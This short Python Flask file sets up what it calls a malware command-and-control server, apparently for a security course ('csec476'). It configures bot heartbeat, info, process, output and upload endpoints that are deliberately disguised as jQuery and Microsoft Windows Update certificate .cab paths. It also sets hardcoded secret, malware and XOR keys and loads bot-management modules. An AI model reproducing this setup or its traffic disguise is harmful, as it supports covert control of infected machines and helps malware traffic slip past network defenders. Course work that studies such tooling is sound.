from flask import Flask

app = Flask(__name__)
#64 MB max download size
app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'

app.config['ENDPOINT_HEARTBEAT'] = '/docroot/js/jquery-ui-1.11.2.custom.min.js'
app.config['ENDPOINT_INFO'] = '/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab'
app.config['ENDPOINT_PS'] = '/msdownload/update/v3/static/trustedr/en/authrootstl.cab'
app.config['ENDPOINT_OUT'] = '/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab'
app.config['ENDPOINT_UPLOAD'] = '/msdownload/update/v3/static/untrustedr/en/authroot.cab'

app.secret_key = b'csec476malware'
app.malware_key = "CSEC476"
app.xor_key = 0x7f

from c2 import auth
from c2 import botmanager
from c2 import dbmain
dbmain.initdb()
